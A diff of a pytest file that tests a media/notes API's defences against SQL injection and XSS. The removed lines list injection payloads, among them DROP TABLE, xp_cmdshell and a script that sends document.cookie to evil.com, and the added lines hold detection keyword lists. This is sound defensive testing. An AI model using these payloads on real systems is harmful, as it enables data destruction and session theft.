@@ -379,74 +379,126 @@ class TestDataValidationNegative:
     """Test data validation and injection prevention."""
     
     def test_sql_injection_in_search(self, authenticated_client):
-        """Test SQL injection attempts in search queries."""
-        sql_injections = [
-            "'; DROP TABLE media; --",
-            "1' OR '1'='1",
-            "' UNION SELECT * FROM users--",
-            "'; DELETE FROM media WHERE '1'='1",
-            "admin'--",
-            "' OR 1=1--",
-            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
-            "' OR EXISTS(SELECT * FROM users WHERE username='admin') AND ''='",
-            "'; EXEC xp_cmdshell('dir'); --",
-            "' UNION ALL SELECT NULL,NULL,NULL--",
-        ]
+        """Test SQL injection attempts in search queries - verify proper sanitization."""
+        sql_injections = TestDataGenerator.malicious_payloads()['sql_injection']
         
-        for injection in sql_injections:
+        print("\n=== SQL Injection Prevention Test ===")
+        blocked_count = 0
+        sanitized_count = 0
+        
+        for injection in sql_injections[:5]:  # Test subset to avoid rate limiting
+            print(f"  Testing: '{injection[:30]}...'")
+            
             try:
                 response = authenticated_client.search_media(injection)
                 
-                # Should return empty results or sanitized query
-                if "results" in response:
-                    # Verify no actual SQL was executed
-                    assert isinstance(response["results"], list), \
-                        "Search should return list even with injection"
+                # Request succeeded - verify injection was sanitized
+                if "results" in response or "items" in response:
+                    results = response.get("results") or response.get("items", [])
+                    assert isinstance(results, list), "Search should return list"
                     
-                    # Check that the system is still functioning
-                    health = authenticated_client.health_check()
-                    assert health["status"] == "healthy", \
-                        "System should remain healthy after injection attempt"
-                        
+                    # Verify no SQL keywords in results (shouldn't execute)
+                    result_str = str(results).lower()
+                    dangerous_indicators = ['drop', 'delete', 'union', 'sleep', 'exec']
+                    
+                    for indicator in dangerous_indicators:
+                        if indicator in injection.lower() and indicator in result_str:
+                            pytest.fail(f"SQL keyword '{indicator}' found in results - possible injection!")
+                    
+                    sanitized_count += 1
+                    print(f"    ✓ Sanitized - returned {len(results)} results")
+                    
+                # Verify system still healthy
+                health = authenticated_client.health_check()
+                assert health["status"] == "healthy", "System unhealthy after injection"
+                
             except httpx.HTTPStatusError as e:
-                # Rejection is also acceptable
-                assert e.response.status_code in [400, 422]
+                if e.response.status_code in [400, 422]:
+                    blocked_count += 1
+                    print(f"    ✓ Blocked with {e.response.status_code}")
+                elif e.response.status_code == 500:
+                    pytest.fail(f"Server error on injection '{injection[:30]}' - possible vulnerability!")
+                else:
+                    print(f"    ? Unexpected status {e.response.status_code}")
+        
+        print(f"\nResults: {blocked_count} blocked, {sanitized_count} sanitized")
+        print("=== SQL Injection Test Complete ===")
+        
+        # At least one method of protection should be active
+        assert blocked_count > 0 or sanitized_count > 0, "No SQL injection protection detected!"
     
     def test_xss_in_note_content(self, authenticated_client, data_tracker):
-        """Test XSS attempts in note content."""
-        xss_payloads = [
-            "<script>alert('XSS')</script>",
-            "<img src=x onerror=alert('XSS')>",
-            "<svg onload=alert('XSS')>",
-            "javascript:alert('XSS')",
-            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
-            "<body onload=alert('XSS')>",
-            "<%2Fscript%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
-            "<script>document.location='http://evil.com?cookie='+document.cookie</script>",
-            "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
-            "';alert(String.fromCharCode(88,83,83))//",
-        ]
+        """Test XSS attempts in note content - verify proper sanitization."""
+        xss_payloads = TestDataGenerator.malicious_payloads()['xss']
         
-        for payload in xss_payloads:
+        print("\n=== XSS Prevention Test ===")
+        blocked_count = 0
+        sanitized_count = 0
+        created_notes = []
+        
+        for payload in xss_payloads[:5]:  # Test subset
+            print(f"  Testing XSS: '{payload[:30]}...'")
+            
             try:
                 response = authenticated_client.create_note(
-                    title=f"XSS Test {payload[:20]}",
+                    title=f"XSS Test",
                     content=payload,
                     keywords=["test", "xss"]
                 )
                 
-                # Note might be created but content should be sanitized
+                # Note created - verify content is sanitized
                 if "id" in response or "note_id" in response:
                     note_id = response.get("id") or response.get("note_id")
                     data_tracker.add_note(note_id)
+                    created_notes.append(note_id)
                     
-                    # Retrieve and verify sanitization
-                    notes = authenticated_client.get_notes()
-                    # Content should be escaped or sanitized
+                    # Retrieve note to check sanitization
+                    try:
+                        note_detail = authenticated_client.client.get(f"/api/v1/notes/{note_id}").json()
+                        stored_content = note_detail.get("content", "")
+                        
+                        # Check if dangerous tags are escaped/removed
+                        dangerous_patterns = ['<script', 'onerror', 'javascript:', 'onclick', '<iframe']
+                        found_dangerous = False
+                        
+                        for pattern in dangerous_patterns:
+                            if pattern.lower() in stored_content.lower():
+                                # Check if it's escaped (e.g., &lt;script&gt;)
+                                if '&lt;' in stored_content or '&gt;' in stored_content:
+                                    print(f"    ✓ Sanitized - HTML escaped")
+                                    sanitized_count += 1
+                                else:
+                                    print(f"    ✗ DANGER: '{pattern}' not escaped in stored content!")
+                                    pytest.fail(f"XSS not sanitized: {pattern} found in content")
+                                found_dangerous = True
+                                break
+                        
+                        if not found_dangerous:
+                            print(f"    ✓ Sanitized - dangerous content removed")
+                            sanitized_count += 1
+                            
+                    except Exception as e:
+                        print(f"    ? Could not verify: {e}")
                     
             except httpx.HTTPStatusError as e:
-                # Rejection is acceptable
-                assert e.response.status_code in [400, 422]
+                if e.response.status_code in [400, 422]:
+                    blocked_count += 1
+                    print(f"    ✓ Blocked with {e.response.status_code}")
+                else:
+                    print(f"    ? Unexpected status {e.response.status_code}")
+        
+        print(f"\nResults: {blocked_count} blocked, {sanitized_count} sanitized")
+        print("=== XSS Test Complete ===")
+        
+        # Cleanup created notes
+        for note_id in created_notes:
+            try:
+                authenticated_client.delete_note(note_id)
+            except:
+                pass
+        
+        # At least one protection method should be active
+        assert blocked_count > 0 or sanitized_count > 0, "No XSS protection detected!"
     
     def test_command_injection_in_prompts(self, authenticated_client, data_tracker):
         """Test command injection in prompt content."""
